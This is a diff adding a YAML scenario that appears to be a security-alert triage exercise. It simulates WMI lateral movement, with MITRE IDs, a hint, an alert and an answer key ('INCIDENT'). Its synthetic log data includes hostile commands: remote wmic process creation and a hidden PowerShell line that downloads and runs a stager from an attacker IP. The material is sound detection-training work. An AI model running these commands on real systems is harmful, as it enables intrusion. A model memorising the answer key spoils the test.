@@ -1,0 +1,61 @@
+meta:
+  name: "WMI Lateral Movement with Payload Drop"
+  difficulty: medium
+  answer: INCIDENT
+  mitre_techniques:
+    - id: T1047
+      name: "Windows Management Instrumentation"
+    - id: T1021.003
+      name: "Remote Services: Distributed Component Object Model"
+  hint: "wmic.exe with /node: pointing to a remote host for process creation is a classic lateral movement technique. The combination of type 3 network logons from an attacker-controlled host immediately followed by remote wmic.exe calls and a dropped executable is a high-confidence lateral movement chain. Authorized IT use of WMI typically originates from known management servers, not user workstations."
+  alert:
+    rule_id: LATERAL_MOVEMENT
+    severity: HIGH
+    summary: "wmic.exe remote process creation detected from {inject_malicious_host} by {inject_malicious_user} — possible WMI lateral movement"
+    description: "Behavioural rule fired: wmic.exe invoked with /node: parameter targeting a remote host, correlated with type 3 network logons from the same source. This pattern is consistent with WMI-based lateral movement. Verify whether the source host is an authorised management system."
+
+world_overrides:
+  attacker_ip: "10.0.2.45"
+  inject_malicious_host: "WS003"
+  inject_malicious_user: "contractor.user"
+
+phases:
+  phase_1:
+    name: "Lateral Movement: Remote WMI Process Execution"
+    technique: T1047
+    count: 2
+    log_factory: sysmon.process_create
+    spread_seconds: 20
+    delay_after_prev: [2, 10]
+    params:
+      dest_host: "{inject_malicious_host}"
+      source_ip: "{attacker_ip}"
+      target_user: "{inject_malicious_user}"
+      command_line:
+        - "wmic.exe /node:WS003 process call create \"cmd.exe /c whoami > C:\\Temp\\out.txt\""
+        - "wmic.exe /node:WS003 /user:contractor.user process call create \"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.2.45/stager')\""
+        - "wmic.exe /node:WS003 process call create \"C:\\Windows\\Temp\\srv.exe\""
+
+  phase_2:
+    name: "Lateral Movement: Network Logons from Attacker Host"
+    technique: T1021.003
+    count: 3
+    log_factory: successful_logon
+    spread_seconds: 60
+    delay_after_prev: [5, 20]
+    params:
+      target_user: "{inject_malicious_user}"
+      source_ip: "{attacker_ip}"
+      dest_host: "{inject_malicious_host}"
+
+  phase_3:
+    name: "Execution: Dropped Payload on Target"
+    technique: T1047
+    count: 2
+    log_factory: sysmon.file_create
+    spread_seconds: 15
+    delay_after_prev: [5, 15]
+    params:
+      dest_host: "{inject_malicious_host}"
+      target_user: "{inject_malicious_user}"
+      target_filename: "C:\\Windows\\Temp\\srv.exe"
